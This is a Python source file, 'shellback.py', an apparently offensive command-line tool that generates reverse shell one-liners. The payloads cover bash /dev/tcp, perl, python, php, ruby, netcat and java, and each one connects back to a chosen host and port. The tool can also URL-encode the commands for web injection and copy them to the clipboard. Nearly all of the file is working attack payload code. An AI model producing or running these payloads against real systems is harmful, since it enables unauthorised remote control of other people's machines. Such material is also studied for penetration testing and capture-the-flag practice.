#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import socket
from pyperclip import copy
from urllib.parse import quote_plus
from colorama import Fore,Back,Style
from argparse import ArgumentParser, RawTextHelpFormatter, ArgumentTypeError

# console colors
F, S, BT = Fore.RESET, Style.RESET_ALL, Style.BRIGHT
FG, FR, FC, BR = Fore.GREEN, Fore.RED, Fore.CYAN, Back.RED


# shell types
SHELL = {
    'sh'   : '/bin/sh',
    'zsh'  : '/bin/zsh',
    'ksh'  : '/bin/ksh',
    'tcsh' : '/bin/tcsh',
    'bash' : '/bin/bash',
    'dash' : '/bin/dash'}


def console():
    """argument parser"""
    parser = ArgumentParser(description="{}shellback.py:{} reverse shell generator".format(BT+FG,S),formatter_class=RawTextHelpFormatter)    
    parser._optionals.title = "{}arguments{}".format(BT,S)
    parser.add_argument('-l', "--lhost", 
                    type=validateIP, 
                    help='Specify local host ip', metavar='')
    parser.add_argument('-p', "--lport", 
                    type=validatePort, default=8080,
                    help="Specify a local port [{0}default {2}{1}8080{2}]".format(BT,FG,S), metavar='')
    parser.add_argument('-v', "--version",
                    help="Specify the language to generate the reverse shell [{0}default {2}{1}bash{2}]".format(BT,FG,S),
                    default='bash', choices=['java', 'python', 'nc1', 'nc2', 'php', 'ruby', 'bash', 'perl'], metavar='')
    parser.add_argument('-f', "--tofile",
                    help="reverse-shell command to be written in a file", 
                    action='store_true')
    parser.add_argument('-c', "--copy",
                    help="Copy reverse-shell command to clipboard [{0}default {2}{1}False{2}]".format(BT,FR,S), 
                    action='store_true')
    parser.add_argument('-u', "--uencode",
                    help="Urlencode the reverse-shell command [{0}default {2}{1}False{2}]".format(BT,FR,S), 
                    action='store_true')
    parser.add_argument('-s', "--shell",
                    help="Specify shell type to use (not always applicable) [{0}default {2}{1}sh{2}]".format(BT,FG,S),
                    default='sh', choices=['sh','zsh','ksh','tcsh','bash','dash'], metavar='')
    args = parser.parse_args()
    return args


def getshell(host, port, pl, shell):
    reverseShells = {
        'bash':   'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(host, port),
        'perl':   "perl -e 'use Socket;$i="+'"{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{3} -i");}};{2}'.format(host, port, "'", shell),
        'python': "python -c '"+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{3}","-i"]);{2}'.format(host, port, "'", shell),
        'php'   : "php -r '"+'$sock=fsockopen("{0}",{1});exec("{3} -i <&3 >&3 2>&3");{2}'.format(host, port, "'", shell),
        'ruby':   "ruby -rsocket -e'"+'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("{3} -i <&%d >&%d 2>&%d",f,f,f){2}'.format(host, port, "'", shell),
        'nc1':    "nc -e {2} {0} {1}".format(host, port,shell),
        'nc2':    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{2} -i 2>&1|nc {0} {1} >/tmp/f".format(host, port,shell),
        'java':   'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()'.format(host, port)
    }
    return reverseShells[pl]


def cmd2file(cmd):
    """prepares reverse-shell command to be written in a file"""
    KEYWORDS = ["python -c '", "perl -e '", "php -r '", "ruby -rsocket -e'"]
    inlist = False
    for keyword in KEYWORDS:
        if keyword in cmd:
            inlist = True
            cmd = cmd.replace(keyword, '')[:-1]
    if inlist:
        new_cmd = [i.strip()+'\n' for i in cmd.split(';')]
        return new_cmd
    else:
        return cmd


def validatePort(port):
    """Validate port number entered"""
    if isinstance(int(port), int):
        if 1 < int(port) < 65536:
            return int(port)
    else:
        raise ArgumentTypeError('{}[x] Port must be in range 1-65535{}'.format(FR,F))


def validateIP(ip):
    """validate ip provided"""
    try:
        if socket.inet_aton(ip):
            return ip
    except socket.error:
        raise ArgumentTypeError('{}[x] Invalid ip provided{}'.format(FR,F))


def urlEncode(cmd):
    """urlencodes the cmd provided"""
    try:
        return quote_plus(cmd)
    except Exception as error:
        print('{}[x] Error:{} "{}"'.format(FR,S,error))
        sys.exit(0)


def generate(host, port, pl, cp, tofile, uenc, shelltype):
    print('{0}[{1}{2}{3}{0}]{3} reverse-shell:\n'.format(BT, FG, pl, S))
    shell = getshell(host, port, pl, SHELL[shelltype])
    if tofile:
        shell = ''.join(cmd2file(shell))
    elif(uenc):
        shell = urlEncode(shell)
    print(shell+'\n')
    if pl not in ('bash', 'java'):
        print('{0}[+]{1} Shell type chosen: {0}{2}{1}'.format(BT,S,SHELL[shelltype]))
    if cp:
        copy(shell)
        print('{}[+] {}{}{} reverse-shell command copied to clipboard!'.format(BT, FG, pl, S))


if __name__ == '__main__':
    args = console()
    if args.lhost:
        generate(args.lhost, args.lport, args.version, args.copy, args.tofile, args.uencode, args.shell)
    else: 
        print('{}usage:{} shellback.py [-h] [-l] [-p] [-v] [-f] [-c] [-u] [-s]'.format(BT,S))
#_EOF